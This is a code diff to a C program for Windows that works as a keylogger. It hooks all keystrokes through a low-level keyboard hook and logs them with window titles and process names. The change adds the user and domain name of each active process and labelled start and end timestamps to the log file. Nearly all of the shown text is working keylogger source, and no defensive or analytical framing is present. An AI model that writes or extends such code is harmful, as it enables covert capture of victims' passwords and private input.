@@ -127,7 +127,11 @@ BOOL proc2uid (HANDLE hProc, char domain[],
 void log_exe(void)
 {
   DWORD id;
-  char pname[256];
+  char  pname[256];
+  DWORD ulen, dlen;
+  char  *cpu, *uid, *dom;
+  char  domain[64], uname[64];
+  HANDLE hProc;
   
   // get the process id
   GetWindowThreadProcessId (hWindow, &id);
@@ -135,8 +139,24 @@ void log_exe(void)
   if (id!=pid)
   {
     pid=id;
-    if (pid2name(pname)==ERROR_SUCCESS) {
-      fprintf (fd, "\nprocess : %s\n", pname);
+    if (pid2name(pname)==ERROR_SUCCESS) 
+    {
+      dom="??";
+      uid="??";
+      hProc=OpenProcess (PROCESS_QUERY_INFORMATION, FALSE, pid);
+      if (hProc!=NULL)  
+      {
+        ulen=sizeof(uname);
+        dlen=sizeof(domain);
+      
+        proc2uid (hProc, domain, &dlen, uname, &ulen);
+      
+        dom=domain;
+        uid=uname;
+        
+        CloseHandle (hProc);
+      }  
+      fprintf (fd, "\nUser: %s\\%s Process: %s\n", dom, uid, pname);
       fflush (fd);
     }
   }
@@ -154,7 +174,7 @@ void log_wnd(void)
 }
 
 // obtain and log current time/date
-void log_time (void)
+void log_time (char s[])
 {
   SYSTEMTIME st;
   char       date[64], time[64];
@@ -167,14 +187,14 @@ void log_time (void)
   GetTimeFormat (LOCALE_SYSTEM_DEFAULT, 0, 
     &st, "HH:mm:ss tt", time, sizeof(time));
   
-  fprintf (fd, "\n%s, %s\n", date, time);
+  fprintf (fd, "\nLog %s at %s, %s\n", s, date, time);
   fflush (fd);
 }
 
 // log time, module and window info
-void log_info (void)
+void log_info (char s[])
 {
-  log_time();
+  log_time(s);
   log_wnd();
   log_exe();
 }
@@ -198,6 +218,7 @@ LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
     // check if window changed
     if (GetForegroundWindow()!=hWindow) {
       log_wnd();
+      log_exe();
     }
     
     // convert escape, backspace or tab to text instead
@@ -237,13 +258,13 @@ int main (void)
   if (fd!=NULL)
   {
     // log the date, system name, user name
-    log_info();
+    log_info("starting");
     // install hook
     hHook=SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
     // loop
     GetMessage (&msg, NULL, 0, 0);
     // log the time
-    log_time();
+    log_time("ending");
     // close log
     fclose (fd);
     // remove hook
